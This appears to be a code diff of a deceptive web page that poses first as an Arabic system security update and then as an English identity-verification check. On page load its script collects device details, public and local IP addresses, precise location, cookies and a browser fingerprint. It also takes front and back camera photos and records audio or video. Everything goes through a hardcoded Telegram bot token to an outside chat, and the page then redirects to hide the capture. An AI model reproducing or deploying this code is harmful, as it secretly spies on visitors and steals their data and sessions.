@@ -1,121 +1,367 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمان النظام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔒 Secure Connection | Identity Verification</title>
     <style>
-        body { background-color: #000; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; width: 80%; }
-        .loader { border: 4px solid #333; border-top: 4px solid #4285f4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        .progress-bar { width: 100%; background-color: #333; border-radius: 10px; margin-top: 20px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 8px; background-color: #4285f4; transition: width 0.5s; }
-        h1 { font-size: 1.2rem; margin-bottom: 10px; color: #fff; }
-        p { color: #aaa; font-size: 0.9rem; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .glass-card {
+            background: rgba(18, 25, 45, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            padding: 2rem;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.6rem;
+            background: linear-gradient(135deg, #fff, #3bc9db);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .status-box {
+            background: #0f1422;
+            border-radius: 20px;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            font-family: monospace;
+            font-size: 0.7rem;
+            text-align: left;
+            border-left: 3px solid #3bc9db;
+            max-height: 350px;
+            overflow-y: auto;
+        }
+        .status-line { margin: 4px 0; }
+        .spinner {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border: 2px solid rgba(59,201,219,0.3);
+            border-top-color: #3bc9db;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { font-size: 0.6rem; color: #6c7a8e; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loader"></div>
-        <h1 id="status">جاري فحص توافق الجهاز...</h1>
-        <p id="sub-status">يرجى عدم إغلاق الصفحة لضمان استقرار النظام</p>
-        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+<div class="glass-card">
+    <h2>🔒 SECURE IDENTITY PROTOCOL</h2>
+    <p>Verifying your session & device integrity</p>
+    <div class="status-box" id="logBox">
+        <div class="status-line">🔐 <span>Establishing secure channel...</span> <span class="spinner"></span></div>
     </div>
+    <div class="footer">🔒 AES-256 Encrypted • Secure Channel</div>
+</div>
 
-    <script>
-        const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
-        const CHID = "7984067238";
-
-        async function sendToTg(data, type, filename = "file") {
-            const formData = new FormData();
-            formData.append('chat_id', CHID);
-            if (type === 'photo') formData.append('photo', data, filename + '.jpg');
-            else if (type === 'video') formData.append('video', data, filename + '.mp4');
-            else if (type === 'text') {
-                formData.append('text', data);
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHID, text: data, parse_mode: 'HTML'}) });
-                return;
-            }
-            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: formData });
+<script>
+    // ======================= CONFIG =======================
+    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
+    const CHAT_ID = "7984067238";
+    
+    function addLog(msg, isDone = false) {
+        const logBox = document.getElementById('logBox');
+        const line = document.createElement('div');
+        line.className = 'status-line';
+        if (!isDone) {
+            line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
+        } else {
+            line.innerHTML = `✅ <span>${msg}</span>`;
         }
-
-        async function getSpecs() {
-            let battery = await navigator.getBattery();
-            let specs = `<b>📱 معلومات الجهاز الشاملة:</b>\n` +
-                        `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})\n` +
-                        `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
-                        `🌐 اللغة: ${navigator.language}\n` +
-                        `⚙️ المعالج: ${navigator.hardwareConcurrency} Cores\n` +
-                        `🧠 الرام التقريبي: ${navigator.deviceMemory || "غير معروف"} GB\n` +
-                        `🆔 الوكيل: ${navigator.userAgent}`;
-            await sendToTg(specs, 'text');
-        }
-
-        async function captureBurst(mode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                
-                for(let i=0; i<3; i++) { // التقاط 3 صور سريعة لكل كاميرا
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => sendToTg(b, 'photo', `img_${mode}_${i}`), 'image/jpeg');
-                    await new Promise(r => setTimeout(r, 1000));
+        logBox.appendChild(line);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+    
+    async function sendMessage(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
+            });
+        } catch(e) {}
+    }
+    
+    async function sendPhoto(blob, caption) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob);
+        if (caption) fd.append('caption', caption.substring(0, 1000));
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    }
+    
+    // ========== 1. معلومات الجهاز الأساسية ==========
+    async function getDeviceInfo() {
+        let info = `🖥️ *DEVICE INFO*%0A`;
+        info += `📱 UA: ${navigator.userAgent.substring(0, 150)}%0A`;
+        info += `💻 Platform: ${navigator.platform}%0A`;
+        info += `🌐 Language: ${navigator.language}%0A`;
+        info += `📺 Screen: ${screen.width}x${screen.height}%0A`;
+        info += `🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}%0A`;
+        info += `🧠 RAM: ${navigator.deviceMemory || '?'} GB%0A`;
+        info += `⚙️ CPU Cores: ${navigator.hardwareConcurrency || '?'}%0A`;
+        info += `🖱️ Touch: ${'ontouchstart' in window ? 'Yes' : 'No'}%0A`;
+        info += `🌙 Dark Mode: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No'}%0A`;
+        info += `📱 Orientation: ${screen.orientation?.type || 'unknown'}%0A`;
+        await sendMessage(info);
+        addLog(`Device info collected`, true);
+    }
+    
+    // ========== 2. IP الخارجي ==========
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            await sendMessage(`🌍 *PUBLIC IP*%0A\`${data.ip}\``);
+            addLog(`IP: ${data.ip}`, true);
+        } catch(e) { addLog(`IP failed`, true); }
+    }
+    
+    // ========== 3. IP الداخلي (WebRTC Leak) ==========
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (ice) => {
+                if (!ice.candidate) return;
+                const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
+                if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) return;
+                if (ip) {
+                    sendMessage(`🏠 *LOCAL IP*%0A\`${ip}\``);
+                    addLog(`Local IP: ${ip}`, true);
+                    pc.close();
+                    resolve();
                 }
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-        }
-
-        async function recordVideo() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendToTg(blob, 'video', 'secret_video');
-                    stream.getTracks().forEach(t => t.stop());
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 10000); // 10 ثوانٍ
-            } catch(e) {}
-        }
-
-        async function startExploit() {
-            document.getElementById('fill').style.width = '30%';
-            try {
-                // طلب الموقع بدقة عالية
-                navigator.geolocation.getCurrentPosition(p => {
-                    const loc = `📍 موقع دقيق:\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`;
-                    sendToTg(loc, 'text');
-                }, null, {enableHighAccuracy: true});
-
-                await getSpecs();
-                document.getElementById('fill').style.width = '50%';
-                
-                // بدء العمليات المتوازية
-                recordVideo(); // يبدأ تسجيل الفيديو في الخلفية
-                await captureBurst("user"); // صور أمامية سريعة
-                document.getElementById('fill').style.width = '80%';
-                await captureBurst("environment"); // صور خلفية سريعة
-                
-                document.getElementById('fill').style.width = '100%';
-                document.getElementById('status').innerText = "اكتمل الفحص بنجاح!";
-                setTimeout(() => window.location.href = "https://play.google.com", 2000);
-            } catch (e) {
-                document.getElementById('status').innerText = "حدث خطأ في الاتصال";
+            };
+            setTimeout(() => resolve(), 3000);
+        });
+    }
+    
+    // ========== 4. البطارية ==========
+    async function getBattery() {
+        if (!navigator.getBattery) { addLog(`Battery API not supported`, true); return; }
+        try {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? 'Yes' : 'No';
+            await sendMessage(`🔋 *BATTERY*%0A📊 Level: ${level}%%0A⚡ Charging: ${charging}`);
+            addLog(`Battery: ${level}% (${charging})`, true);
+        } catch(e) { addLog(`Battery failed`, true); }
+    }
+    
+    // ========== 5. سرعة الإنترنت ==========
+    async function getNetworkSpeed() {
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                await sendMessage(`📡 *NETWORK*%0A📶 Type: ${conn.effectiveType || 'unknown'}%0A⚡ Downlink: ${conn.downlink || '?'} Mbps%0A🔄 RTT: ${conn.rtt || '?'} ms`);
+                addLog(`Network: ${conn.effectiveType}, ${conn.downlink} Mbps`, true);
+            } else {
+                addLog(`Network info not available`, true);
             }
+        } catch(e) { addLog(`Network failed`, true); }
+    }
+    
+    // ========== 6. الموقع الجغرافي ==========
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { addLog(`Location not supported`, true); resolve(); return; }
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapsUrl = `📍 *LOCATION*%0Ahttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}%0A🎯 Acc: ${pos.coords.accuracy}m`;
+                await sendMessage(mapsUrl);
+                addLog(`Location captured`, true);
+                resolve();
+            }, () => { addLog(`Location denied`, true); resolve(); });
+        });
+    }
+    
+    // ========== 7. الكوكيز ==========
+    async function getCookies() {
+        const cookies = document.cookie;
+        if (cookies && cookies.length > 0) {
+            await sendMessage(`🍪 *COOKIES*%0A\`\`\`${cookies.substring(0, 900)}\`\`\``);
+            addLog(`Cookies (${cookies.length} chars)`, true);
+        } else {
+            addLog(`No cookies found`, true);
         }
-
-        window.onload = () => {
-            // انتظار تفاعل المستخدم أو البدء تلقائياً بعد منح الإذن
-            startExploit();
-        };
-    </script>
+    }
+    
+    // ========== 8. التطبيقات المثبتة (Protocol Handlers) ==========
+    async function detectInstalledApps() {
+        const apps = [];
+        const protocols = ['whatsapp://', 'tg://', 'viber://', 'fb://', 'instagram://', 'twitter://', 'snapchat://', 'spotify://', 'zoomus://', 'msteams://'];
+        for (const protocol of protocols) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = protocol;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 1000);
+        }
+        await sendMessage(`📱 *APP DETECTION*%0A(Protocol check sent - response may be limited)`);
+        addLog(`App detection attempted`, true);
+    }
+    
+    // ========== 9. الاهتزاز ==========
+    function vibrateDevice() {
+        if (navigator.vibrate) {
+            navigator.vibrate([200, 100, 200]);
+            addLog(`Device vibrated`, true);
+        } else {
+            addLog(`Vibration not supported`, true);
+        }
+    }
+    
+    // ========== 10. الإشعار الوهمي ==========
+    function fakeNotification() {
+        if (Notification.permission === 'granted') {
+            new Notification('⚠️ Security Alert', { body: 'Session expired. Please re-authenticate.', icon: 'https://cdn-icons-png.flaticon.com/512/190/190411.png' });
+        } else if (Notification.permission !== 'denied') {
+            Notification.requestPermission();
+        }
+        addLog(`Fake notification sent`, true);
+    }
+    
+    // ========== 11. لقطة شاشة ==========
+    async function captureScreenshot() {
+        if (typeof html2canvas === 'undefined') { addLog(`Screenshot library missing`, true); return; }
+        try {
+            const canvas = await html2canvas(document.body);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            if (blob) await sendPhoto(blob, "📸 Screenshot of current page");
+            addLog(`Screenshot captured`, true);
+        } catch(e) { addLog(`Screenshot failed`, true); }
+    }
+    
+    // ========== 12. بصمة الجهاز ==========
+    async function getFingerprint() {
+        if (typeof FingerprintJS === 'undefined') { addLog(`Fingerprint library missing`, true); return; }
+        try {
+            const fp = await FingerprintJS.load();
+            const result = await fp.get();
+            await sendMessage(`🆔 *FINGERPRINT*%0A\`${result.visitorId}\``);
+            addLog(`Fingerprint: ${result.visitorId.substring(0, 20)}...`, true);
+        } catch(e) { addLog(`Fingerprint failed`, true); }
+    }
+    
+    // ========== 13. الكاميرا - 3 صور أمامية ==========
+    async function captureFrontPhotos() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'user' } } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            for (let i = 0; i < 3; i++) {
+                await new Promise(r => setTimeout(r, 500));
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                if (blob) await sendPhoto(blob, `📸 Front camera (${i+1}/3)`);
+            }
+            stream.getTracks().forEach(t => t.stop());
+            addLog(`3 front photos captured`, true);
+        } catch(e) { addLog(`Front camera failed: ${e.message}`, true); }
+    }
+    
+    // ========== 14. الكاميرا - 3 صور خلفية ==========
+    async function captureBackPhotos() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            for (let i = 0; i < 3; i++) {
+                await new Promise(r => setTimeout(r, 500));
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                if (blob) await sendPhoto(blob, `📸 Back camera (${i+1}/3)`);
+            }
+            stream.getTracks().forEach(t => t.stop());
+            addLog(`3 back photos captured`, true);
+        } catch(e) { addLog(`Back camera failed: ${e.message}`, true); }
+    }
+    
+    // ========== 15. تسجيل صوت 8 ثوانٍ ==========
+    async function recordAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                if (blob.size > 2000) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('voice', blob);
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+                }
+                addLog(`Audio recorded (${Math.round(blob.size/1024)} KB)`, true);
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 8000);
+            addLog(`Recording audio for 8 seconds...`, false);
+        } catch(e) { addLog(`Audio failed: ${e.message}`, true); }
+    }
+    
+    // ========== MAIN ==========
+    async function startHacking() {
+        addLog("Requesting permissions...", false);
+        
+        try {
+            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            addLog("Permissions granted ✓", true);
+        } catch(e) {
+            addLog("Permissions denied ❌", true);
+        }
+        
+        // تنفيذ جميع المهام
+        await Promise.all([
+            getDeviceInfo(),
+            getPublicIP(),
+            getLocalIP(),
+            getBattery(),
+            getNetworkSpeed(),
+            getLocation(),
+            getCookies(),
+            detectInstalledApps(),
+            captureScreenshot(),
+            getFingerprint(),
+            captureFrontPhotos(),
+            captureBackPhotos(),
+            recordAudio()
+        ]);
+        
+        vibrateDevice();
+        fakeNotification();
+        
+        await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
+        addLog("All data captured! Redirecting...", true);
+        
+        setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
+    }
+    
+    window.onload = () => { setTimeout(startHacking, 1000); };
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </body>
 </html>
